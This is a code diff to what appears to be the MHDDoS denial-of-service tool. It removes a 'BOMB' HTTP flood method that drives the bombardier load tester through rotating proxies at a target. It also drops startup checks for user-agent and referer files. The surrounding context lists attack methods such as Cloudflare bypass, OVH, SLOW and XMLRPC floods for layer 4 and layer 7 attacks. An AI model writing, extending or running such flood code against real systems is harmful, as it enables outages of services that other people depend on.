@@ -74,7 +74,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER",
+        "APACHE", "XMLRPC", "BOT", "DOWNLOADER",
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -840,33 +840,6 @@ class HttpFlood:
         Tools.safe_close(s)
         return packets
 
-    def BOMB(self) -> int:
-        assert self._proxies, \
-            'This method requires proxies. ' \
-            'Without proxies you can use github.com/codesenberg/bombardier'
-
-        while True:
-            proxy = randchoice(self._proxies)
-            if proxy.type != ProxyType.SOCKS4:
-                break
-
-        bombardier_path = Path.home() / "go/bin/bombardier"
-        res = run(
-            [
-                f'{bombardier_path}',
-                f'--connections={self._rpc}',
-                '--http2',
-                '--method=GET',
-                '--latencies',
-                '--timeout=30s',
-                f'--requests={self._rpc}',
-                f'--proxy={proxy}',
-                f'{self._target.human_repr()}',
-            ],
-            stdout=PIPE,
-        )
-        return 1
-
     def SLOW(self) -> int:
         payload: bytes = self.generate_payload()
         s, packets = None, 0
@@ -928,7 +901,6 @@ class HttpFlood:
             ).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
-        if name == "BOMB": self.SENT_FLOOD = self.BOMB
 
 
 def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
@@ -937,22 +909,6 @@ def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
 
     (url, ip), proxies = Tools.parse_params(url, ip, proxies)
     if method in Methods.LAYER7_METHODS:
-        bombardier_path = Path.home() / "go/bin/bombardier"
-
-        if method == "BOMB":
-            assert (
-                bombardier_path.exists()
-                or bombardier_path.with_suffix('.exe').exists()
-            ), (
-                "Install bombardier: "
-                "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
-            )
-
-        if not USERAGENTS:
-            exit("Empty Useragent File ")
-        if not REFERERS:
-            exit("Empty Referer File ")
-
         return HttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
 
     if method in Methods.LAYER4_METHODS:
